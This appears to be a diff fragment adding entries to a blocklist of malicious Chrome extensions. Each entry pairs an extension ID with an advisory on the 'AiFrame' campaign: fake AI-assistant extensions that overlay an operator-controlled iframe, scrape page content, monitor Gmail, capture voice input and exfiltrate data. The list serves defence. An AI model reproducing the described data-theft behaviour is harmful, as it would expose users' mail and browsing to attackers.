+    "advisory": "AiFrame 'XAI' (138 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "bilfflcophfehljhpnklmcelkoiffapb",
+    "advisory": "AiFrame 'AI For Translation' (91 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "cgmmcoandmabammnhfnjcakdeejbfimn",
+    "advisory": "AiFrame 'Grok' (261 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "cicjlpmjmimeoempffghfglndokjihhn",
+    "advisory": "AiFrame 'AI Cover Letter Generator' (27 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "ckicoadchmmndbakbokhapncehanaeni",
+    "advisory": "AiFrame 'AI Email Writer' (64 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "ckneindgfbjnbbiggcmnjeofelhflhaj",
+    "advisory": "AiFrame 'AI Image Generator Chat GPT' (249 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "cmpmhhjahlioglkleiofbjodhhiejhei",
+    "advisory": "AiFrame 'AI Translator' (194 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "dbclhjpifdfkofnmjfpheiondafpkoed",
+    "advisory": "AiFrame 'Ai Wallpaper Generator' (289 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "djhjckkfgancelbmgcamjimgphaphjdl",
+    "advisory": "AiFrame 'AI Sidebar' (9,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "ebmmjmakencgmgoijdfnbailknaaiffh",
+    "advisory": "AiFrame 'Chat With Gemini' (760 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "ecikmpoikkcelnakpgaeplcjoickgacj",
+    "advisory": "AiFrame 'Ai Picture Generator' (813 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "fdlagfnfaheppaigholhoojabfaapnhb",
+    "advisory": "AiFrame 'Google Gemini' (7,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "flnecpdpbhdblkpnegekobahlijbmfok",
+    "advisory": "AiFrame 'ChatGPT Picture Generator' (251 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "fnjinbdmidgjkpmlihcginjipjaoapol",
+    "advisory": "AiFrame 'Email Generator AI' (881 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "fpmkabpaklbhbhegegapfkenkmpipick",
+    "advisory": "AiFrame 'Chat GPT for Gmail' (1,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "fppbiomdkfbhgjjdmojlogeceejinadg",
+    "advisory": "AiFrame 'Gemini AI Sidebar' (80,000; removed by Google 2025-02-06 and re-uploaded as gghdfkafnhfpaooiolhncejnlgglhkhe installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "gcdfailafdfjbailcdcbjmeginhncjkb",
+    "advisory": "AiFrame 'Grok Chatbot' (225 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "gcfianbpjcfkafpiadmheejkokcmdkjl",
+    "advisory": "AiFrame 'Llama' (147 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "gghdfkafnhfpaooiolhncejnlgglhkhe",
+    "advisory": "AiFrame 'AI Sidebar' (50,000; identical rebuild of the removed Gemini AI Sidebar installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "gnaekhndaddbimfllbgmecjijbbfpabc",
+    "advisory": "AiFrame 'Ask Gemini' (1,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "gohgeedemmaohocbaccllpkabadoogpl",
+    "advisory": "AiFrame 'DeepSeek Chat' (1,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "hgnjolbjpjmhepcbjgeeallnamkjnfgi",
+    "advisory": "AiFrame 'AI Letter Generator' (129 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "idhknpoceajhnjokpnbicildeoligdgh",
+    "advisory": "AiFrame 'ChatGPT Translation' (1,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "kblengdlefjpjkekanpoidgoghdngdgl",
+    "advisory": "AiFrame 'AI GPT' (20,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "kepibgehhljlecgaeihhnmibnmikbnga",
+    "advisory": "AiFrame 'DeepSeek Download' (275 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "llojfncgbabajmdglnkbhmiebiinohek",
+    "advisory": "AiFrame 'ChatGPT Sidebar' (10,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "lodlcpnbppgipaimgbjgniokjcnpiiad",
+    "advisory": "AiFrame 'AI Message Generator' (24 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "nkgbfengofophpmonladgaldioelckbe",
+    "advisory": "AiFrame 'Chat Bot GPT' (426 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "nlhpidbjmmffhoogcennoiopekbiglbp",
+    "advisory": "AiFrame 'AI Assistant' (50,000; marketed as Claude installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "pgfibniplgcnccdnkhblpmmlfodijppg",
+    "advisory": "AiFrame 'ChatGBT' (1,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "phiphcloddhmndjbdedgfbglhpkjcffh",
+    "advisory": "AiFrame 'Asking Chat Gpt' (396 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
   }
 ]
